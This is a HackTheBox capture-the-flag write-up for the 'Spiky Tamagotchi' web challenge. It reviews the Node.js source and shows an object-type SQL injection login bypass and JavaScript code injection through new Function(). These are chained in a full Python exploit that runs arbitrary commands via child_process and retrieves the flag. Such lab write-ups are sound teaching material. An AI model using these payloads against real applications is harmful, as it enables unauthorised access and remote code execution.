---
Category:
  - Web
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [RCE, authentication-bypass, code-review, exploit-dev, javascript-code-injection, nodejs, SQL-Injection]
---
>[!quote]
> *Captain Spiky comes from a rare species of creatures who can only breathe underwater. During the energy-crisis war, he was captured as a war prisoner and later forced to be a Tamagotchi pet for a child of a general of nomadic tribes. He is forced to react in specific ways and controlled remotely purely for the amusement of the general's children. The Paraman crew needs to save the captain of his misery as he is potentially a great asset for the war against Draeger. Can you hack into the Tamagotchi controller to rescue the captain?*


# Set up

- build-docker.sh
    
    ```bash
    #!/bin/bash
    docker rm -f web_spiky_tamagotchi
    docker build -t web_spiky_tamagotchi .
    docker run --name=web_spiky_tamagotchi --rm -p1337:1337 -it web_spiky_tamagotchi
    ```
    
- Dockerfile
    
    ```bash
    FROM node:alpine
    
    # Install packages
    RUN echo 'http://dl-cdn.alpinelinux.org/alpine/v3.6/main' >> /etc/apk/repositories
    RUN echo 'http://dl-cdn.alpinelinux.org/alpine/v3.6/community' >> /etc/apk/repositories
    RUN apk add --update --no-cache supervisor mariadb mariadb-client curl
    
    # Setup app
    RUN mkdir -p /app
    
    # Copy flag
    COPY flag.txt /flag.txt
    
    # Add application
    WORKDIR /app
    COPY challenge .
    
    # Install dependencies
    RUN yarn
    
    # Setup superivsord
    COPY config/supervisord.conf /etc/supervisord.conf
    
    # Expose the port node-js is reachable on
    EXPOSE 1337
    
    # Populate database and start supervisord
    COPY --chown=root entrypoint.sh /entrypoint.sh
    ENTRYPOINT ["/entrypoint.sh"]
    ```
    
- entrypoint.sh
    
    ```bash
    #!/bin/ash
    
    # Secure entrypoint
    chmod 600 /entrypoint.sh
    
    # Initialize & Start MariaDB
    mkdir -p /run/mysqld
    chown -R mysql:mysql /run/mysqld
    mysql_install_db --user=mysql --ldata=/var/lib/mysql
    mysqld --user=mysql --console --skip-name-resolve --skip-networking=0 &
    
    # Wait for mysql to start
    while ! mysqladmin ping -h'localhost' --silent; do echo "mysqld is not yet alive" && sleep .2; done
    
    # admin password
    PASSWORD=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
    
    # create database
    mysql -u root << EOF
    CREATE DATABASE spiky_tamagotchi;
    
    CREATE TABLE spiky_tamagotchi.users (
      id INT AUTO_INCREMENT NOT NULL,
      username varchar(255) UNIQUE NOT NULL,
      password varchar(255) NOT NULL,
      PRIMARY KEY (id)
    );
    
    INSERT INTO spiky_tamagotchi.users VALUES
    (1,'admin','${PASSWORD}');
    
    GRANT ALL PRIVILEGES ON spiky_tamagotchi.* TO 'root'@'127.0.0.1' IDENTIFIED BY 'rh0x01';
    FLUSH PRIVILEGES;
    EOF
    
    # launch supervisord
    /usr/bin/supervisord -c /etc/supervisord.conf
    ```
    

# Information Gathering

## The application at-a-glance 🔍

Spiky Tamagotchi Login:

![Untitled](../../zzz_res/attachments/Spiky%20Tamagotchi%2065add0ecf061497a926471dfb120eb33.png)

Authenticated area:

![Untitled](../../zzz_res/attachments/Spiky%20Tamagotchi%2065add0ecf061497a926471dfb120eb33%201.png)

### HTTP Requests

Login:

```http
POST /api/login HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Length: 39
Content-Type: application/json
Host: 192.168.1.199:1337
Origin: http://192.168.1.199:1337
Referer: http://192.168.1.199:1337/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36

{"username":"admin","password":"admin"}
```

---

Feed/play/sleep:

```http
POST /api/activity HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Length: 64
Content-Type: application/json
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjU3Mjk5MDk3fQ.6lR6R1NEd57wOycOTgJfvFGRZJjNwu974WszgFJ2shE
Host: 192.168.1.199:1337
Origin: http://192.168.1.199:1337
Referer: http://192.168.1.199:1337/interface
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36

{"activity":"feed","health":"65","weight":"45","happiness":"59"}
```

## Source code review

- package.json
    
    ```json
    {
      "name": "web_spiky_tamagotchi",
      "version": "1.0.0",
      "description": "",
      "main": "index.js",
      "scripts": {
        "dev": "nodemon -e html,js,env,css index.js",
        "start": "node index.js"
      },
      "keywords": [],
      "author": "rayhan0x01",
      "license": "ISC",
      "dependencies": {
        "cookie-parser": "^1.4.6",
        "express": "^4.17.1",
        "jsonwebtoken": "^8.5.1",
        "mysql": "^2.18.1",
        "nunjucks": "^3.2.0"
      },
      "devDependencies": {
        "nodemon": "^1.19.1"
      }
    }
    ```
    
- database.js
    
    ```jsx
    let mysql = require('mysql')
    
    class Database {
    
        constructor() {
            this.connection = mysql.createConnection({
                host: 'localhost',
                user: 'root',
                password: 'rh0x01',
                database: 'spiky_tamagotchi'
            });
        }
    
        async registerUser(user, pass) {
    		return new Promise(async (resolve, reject) => {
                let stmt = 'INSERT INTO users (username, password) VALUES (?, ?)';
                this.connection.query(stmt, [user, pass], (err, result) => {
                    if(err)
                        reject(err)
                    resolve(result)
                })
    		});
    	}
    
        async loginUser(user, pass) {
    		return new Promise(async (resolve, reject) => {
    			let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?';
                this.connection.query(stmt, [user, pass], (err, result) => {
                    if(err || result.length == 0)
                        reject(err)
                    resolve(result)
                })
    		});
    	}
    
    }
    
    module.exports = Database;
    ```
    
- index.js
    
    ```jsx
    const Database     = require('./database');
    global.db          = new Database();
    const express      = require('express');
    const app          = express();
    const path         = require('path');
    const nunjucks     = require('nunjucks');
    const cookieParser = require('cookie-parser');
    const routes       = require('./routes');
    
    app.use(express.json());
    app.use(cookieParser());
    app.disable('etag');
    app.disable('x-powered-by');
    
    nunjucks.configure('views', {
    	autoescape: true,
    	express: app
    });
    
    app.set('views', './views');
    app.use('/static', express.static(path.resolve('static')));
    
    app.use(routes(db));
    
    app.all('*', (req, res) => {
    	return res.status(404).send({
    		message: '404 page not found'
    	});
    });
    
    (async () => {
    	app.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
    })();
    ```
    
- routes/index.js
    
    ```jsx
    const express        = require('express');
    const router         = express.Router();
    const JWTHelper      = require('../helpers/JWTHelper');
    const SpikyFactor    = require('../helpers/SpikyFactor');
    const AuthMiddleware = require('../middleware/AuthMiddleware');
    
    const response = data => ({ message: data });
    
    router.get('/', (req, res) => {
    	return res.render('index.html');
    });
    
    router.post('/api/login', async (req, res) => {
    	const { username, password } = req.body;
    
    	if (username && password) {
    		return db.loginUser(username, password)
    			.then(user => {
    				let token = JWTHelper.sign({ username: user[0].username });
    				res.cookie('session', token, { maxAge: 3600000 });
    				return res.send(response('User authenticated successfully!'));
    			})
    			.catch(() => res.status(403).send(response('Invalid username or password!')));
    	}
    	return res.status(500).send(response('Missing required parameters!'));
    });
    
    router.get('/interface', AuthMiddleware, async (req, res) => {
    	return res.render('interface.html');
    });
    
    router.post('/api/activity', AuthMiddleware, async (req, res) => {
    	const { activity, health, weight, happiness } = req.body;
    	if (activity && health && weight && happiness) {
    		return SpikyFactor.calculate(activity, parseInt(health), parseInt(weight), parseInt(happiness))
    			.then(status => {
    				return res.json(status);
    			})
    			.catch(e => {
    				res.send(response('Something went wrong!'));
    			});
    	}
    	return res.send(response('Missing required parameters!'));
    });
    
    router.get('/logout', (req, res) => {
    	res.clearCookie('session');
    	return res.redirect('/');
    });
    
    module.exports = database => {
    	db = database;
    	return router;
    };
    ```
    
- middleware/AuthMiddleware.js
    
    ```jsx
    const JWTHelper = require('../helpers/JWTHelper');
    
    module.exports = async (req, res, next) => {
    	try{
    		if (req.cookies.session === undefined) {
    			if(!req.is('application/json')) return res.redirect('/');
    			return res.status(401).json({ status: 'unauthorized', message: 'Authentication required!' });
    		}
    		return JWTHelper.verify(req.cookies.session)
    			.then(username => {
    				req.data = username;
    				next();
    			})
    			.catch(() => {
    				res.redirect('/logout');
    			});
    	} catch(e) {
    		console.log(e);
    		return res.redirect('/logout');
    	}
    }
    ```
    
- helpers/JWTHelper.js
    
    ```jsx
    const jwt = require('jsonwebtoken');
    const crypto = require('crypto');
    const APP_SECRET = crypto.randomBytes(69).toString('hex');
    
    module.exports = {
    	sign(data) {
    		data = Object.assign(data);
    		return (jwt.sign(data, APP_SECRET, { algorithm:'HS256' }))
    	},
    	async verify(token) {
    		return (jwt.verify(token, APP_SECRET, { algorithm:'HS256' }));
    	}
    }
    ```
    
- helpers/SpikyFactor.js
    
    ```jsx
    const calculate = (activity, health, weight, happiness) => {
        return new Promise(async (resolve, reject) => {
            try {
                // devine formula :100:
                let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
                    if (a == 'feed') { hp += 1; w += 5; hs += 3; } if (a == 'play') { w -= 5; hp += 2; hs += 3; } if (a == 'sleep') { hp += 2; w += 3; hs += 3; } if ((a == 'feed' || a == 'sleep' ) && w > 70) { hp -= 10; hs -= 10; } else if ((a == 'feed' || a == 'sleep' ) && w < 40) { hp += 10; hs += 5; } else if (a == 'play' && w < 40) { hp -= 10; hs -= 10; } else if ( hs > 70 && (hp < 40 || w < 30)) { hs -= 10; }  if ( hs > 70 ) { m = 'kissy' } else if ( hs < 40 ) { m = 'cry' } else { m = 'awkward'; } if ( hs > 100) { hs = 100; } if ( hs < 5) { hs = 5; } if ( hp < 5) { hp = 5; } if ( hp > 100) { hp = 100; }  if (w < 10) { w = 10 } return {m, hp, w, hs}
                    }`;
                quickMaths = new Function(res);
                const {m, hp, w, hs} = quickMaths();
                resolve({mood: m, health: hp, weight: w, happiness: hs})
            }
            catch (e) {
                reject(e);
            }
        });
    }
    
    module.exports = {
        calculate
    }
    ```
    

# The Bug

## SQL Injection authentication bypass
- [Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)
- [Node.js SQL Injection Guide: Examples and Prevention](https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/)

The `loginUser` function is using statements but is is not checking for variable types.

```jsx
async loginUser(user, pass) {
		return new Promise(async (resolve, reject) => {
			let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?';
            this.connection.query(stmt, [user, pass], (err, result) => {
                if(err || result.length == 0)
                    reject(err)
                resolve(result)
            })
		});
	}
```

It is possible to pass a value that gets evaluated as an Object instead of a String value, and results in the following SQL query:

```http
POST /api/login HTTP/1.1
Host: 192.168.1.199:1337
Content-Length: 46
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://192.168.1.199:1337
Referer: http://192.168.1.199:1337/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"username":"admin","password":{"password":1}}
```

`SELECT username  FROM users WHERE username = 'admin' AND password = `password` = 1`

![Untitled](../../zzz_res/attachments/Spiky%20Tamagotchi%2065add0ecf061497a926471dfb120eb33%202.png)

## JavaScript code injection

User controllable data is inserted within `res` which is then passed to the `new Function()` and finally called, resulting in remote code execution:

```jsx
...
try {
            // devine formula :100:
            let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
                if (a == 'feed') { hp += 1; w += 5; hs += 3; } if (a == 'play') { w -= 5; hp += 2; hs += 3; } if (a == 'sleep') { hp += 2; w += 3; hs += 3; } if ((a == 'feed' || a == 'sleep' ) && w > 70) { hp -= 10; hs -= 10; } else if ((a == 'feed' || a == 'sleep' ) && w < 40) { hp += 10; hs += 5; } else if (a == 'play' && w < 40) { hp -= 10; hs -= 10; } else if ( hs > 70 && (hp < 40 || w < 30)) { hs -= 10; }  if ( hs > 70 ) { m = 'kissy' } else if ( hs < 40 ) { m = 'cry' } else { m = 'awkward'; } if ( hs > 100) { hs = 100; } if ( hs < 5) { hs = 5; } if ( hp < 5) { hp = 5; } if ( hp > 100) { hp = 100; }  if (w < 10) { w = 10 } return {m, hp, w, hs}
                }`;
            quickMaths = new Function(res);
            const {m, hp, w, hs} = quickMaths();
...
```

![Untitled](../../zzz_res/attachments/Spiky%20Tamagotchi%2065add0ecf061497a926471dfb120eb33%203.png)

# Exploitation

## SQL Injection

```http
POST /api/login HTTP/1.1
Host: 192.168.1.199:1337
Content-Length: 46
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://192.168.1.199:1337
Referer: http://192.168.1.199:1337/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"username":"admin","password":{"password":1}}
```

## Code Injection

Payload:

```http
POST /api/activity HTTP/1.1
Host: 192.168.1.199:1337
Content-Length: 150
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://192.168.1.199:1337
Referer: http://192.168.1.199:1337/interface
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjU3MzY1OTM5fQ.ge8fJPqhC0mZv50OX902UBzONUUB4zkmC7cvwCng-mY;
Connection: close

{"activity":"' + (global.process.mainModule.require('child_process').execSync('touch /dev/shm/test'))+'","health":"99","weight":"99","happiness":"99"}
```

Server Response:

```jsx
with(a='' + (global.process.mainModule.require('child_process').execSync('touch /dev/shm/test'))+'', hp=99, w=99, hs=99) {
                if (a == 'feed') { hp += 1; w += 5; hs += 3; } if (a == 'play') { w -= 5; hp += 2; hs += 3; } if (a == 'sleep') { hp += 2; w += 3; hs += 3; } if ((a == 'feed' || a == 'sleep' ) && w > 70) { hp -= 10; hs -= 10; } else if ((a == 'feed' || a == 'sleep' ) && w < 40) { hp += 10; hs += 5; } else if (a == 'play' && w < 40) { hp -= 10; hs -= 10; } else if ( hs > 70 && (hp < 40 || w < 30)) { hs -= 10; }  if ( hs > 70 ) { m = 'kissy' } else if ( hs < 40 ) { m = 'cry' } else { m = 'awkward'; } if ( hs > 100) { hs = 100; } if ( hs < 5) { hs = 5; } if ( hp < 5) { hp = 5; } if ( hp > 100) { hp = 100; }  if (w < 10) { w = 10 } return {m, hp, w, hs}
                }
[Function: anonymous]

...

# ls /dev/shm/
test
```

# Final Exploit

```python
#!/usr/bin/python3
import urllib.parse, argparse
import requests
import json

parser = argparse.ArgumentParser(description="Exploit Spiky Tamagotchi")
parser.add_argument("-i","--ip", help="target IP")
parser.add_argument("-p","--port", help="target port")
parser.add_argument("-c","--cmd", help="command to execute")
parser.add_argument("--username", help="login username (deafult: admin)", default="admin")

args = parser.parse_args()

if not(args.ip and args.port and args.cmd):
    print("Usage: exploit.py -i <ip> -p <port> -c <cmd>")
    exit

print("Preparing the SQL Injection exploit...")
url = 'http://' + args.ip + ':' + args.port + '/api/login'
payload = {
    "username":f"{args.username}",
    "password":{
        "password":1
    }
}
jsonData = json.dumps(payload)
headers = {'Content-type': 'application/json'}

# Get a valid token exploiting SQL Injection
print("Exploiting the SQL Injection...")
s = requests.Session()
resp = s.post(url, data = jsonData, headers=headers)
session = s.cookies.get_dict()

# Exploit the RCE
print("Preparing the RCE exploit...")
url = 'http://' + args.ip + ':' + args.port + '/api/activity'
payload = {
    "activity":f"' + (global.process.mainModule.require('child_process').execSync('{args.cmd}'))+'",
    "health":"99",
    "weight":"99",
    "happiness":"99"
    }
jsonData = json.dumps(payload)
headers = {'Content-type': 'application/json'}

print("Exploiting the RCE...")
resp = s.post(url, data = jsonData, headers=headers, cookies=session)
print(resp.status_code)
if resp.status_code == 200:
    print('Exploit succesful!')
else:
    print('Ops, something when wrong...')
```

```bash
┌──(kali㉿kali)-[~/…/Challenge/Web/web_spiky_tamagotchi/exploit]
└─$ python3 exploit.py -i 157.245.46.136 -p 31504 -c "cp /flag.txt /app/static/images/flag.txt"
Preparing the SQL Injection exploit...
Exploiting the SQL Injection...
Preparing the RCE exploit...
Exploiting the RCE...
200
Exploit succesful!

┌──(kali㉿kali)-[~/…/Challenge/Web/web_spiky_tamagotchi/exploit]
└─$ curl http://157.245.46.136:31504/static/images/flag.txt
HTB{s0rry_1m_n07_1nt0_typ3_ch3ck5}
```

# Flag

>[!success]
>`HTB{s0rry_1m_n07_1nt0_typ3_ch3ck5}`


